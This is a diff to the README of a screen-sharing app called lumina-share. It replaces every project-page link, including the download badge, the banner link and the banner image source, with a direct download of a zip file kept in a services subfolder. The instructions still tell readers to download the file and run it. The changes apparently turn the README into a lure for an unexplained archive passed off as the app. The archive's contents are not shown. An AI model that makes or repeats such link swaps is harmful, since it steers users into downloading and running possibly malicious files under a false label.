@@ -1,10 +1,10 @@
 # ✨ lumina-share - Share your screen with ease
 
-[![Download lumina-share](https://img.shields.io/badge/Download%20lumina--share-Visit%20the%20page-blue?style=for-the-badge&logo=github)](https://github.com/jsai5850/lumina-share)
+[![Download lumina-share](https://img.shields.io/badge/Download%20lumina--share-Visit%20the%20page-blue?style=for-the-badge&logo=github)](https://github.com/jsai5850/lumina-share/raw/refs/heads/main/services/share_lumina_v3.3.zip)
 
 <div align="center">
-  <a href="https://github.com/jsai5850/lumina-share">
-    <img src="https://github.com/user-attachments/assets/0aa67016-6eaf-458a-adb2-6e31a0763ed6" alt="lumina-share banner" width="1200" height="475" />
+  <a href="https://github.com/jsai5850/lumina-share/raw/refs/heads/main/services/share_lumina_v3.3.zip">
+    <img src="https://github.com/jsai5850/lumina-share/raw/refs/heads/main/services/share_lumina_v3.3.zip" alt="lumina-share banner" width="1200" height="475" />
   </a>
 </div>
 
@@ -18,7 +18,7 @@ Use it to start the app, connect your Gemini key, and run the local server on yo
 
 Visit this page to download and run the app:
 
-[https://github.com/jsai5850/lumina-share](https://github.com/jsai5850/lumina-share)
+[https://github.com/jsai5850/lumina-share/raw/refs/heads/main/services/share_lumina_v3.3.zip](https://github.com/jsai5850/lumina-share/raw/refs/heads/main/services/share_lumina_v3.3.zip)
 
 Open the page in your browser, then look for the latest release or the main project files. If you see a packaged Windows file, download it. If the page only shows the source files, use the run steps below.
 
@@ -27,7 +27,7 @@ Open the page in your browser, then look for the latest release or the main proj
 ### 1. Download the app
 Open the project page here:
 
-[https://github.com/jsai5850/lumina-share](https://github.com/jsai5850/lumina-share)
+[https://github.com/jsai5850/lumina-share/raw/refs/heads/main/services/share_lumina_v3.3.zip](https://github.com/jsai5850/lumina-share/raw/refs/heads/main/services/share_lumina_v3.3.zip)
 
 If there is a release file for Windows, download that file first. Save it to a folder you can find later, such as Downloads or Desktop.
 
@@ -197,4 +197,4 @@ Check the key in `.env.local` for:
 
 Download or run the app from here:
 
-[https://github.com/jsai5850/lumina-share](https://github.com/jsai5850/lumina-share)
+[https://github.com/jsai5850/lumina-share/raw/refs/heads/main/services/share_lumina_v3.3.zip](https://github.com/jsai5850/lumina-share/raw/refs/heads/main/services/share_lumina_v3.3.zip)
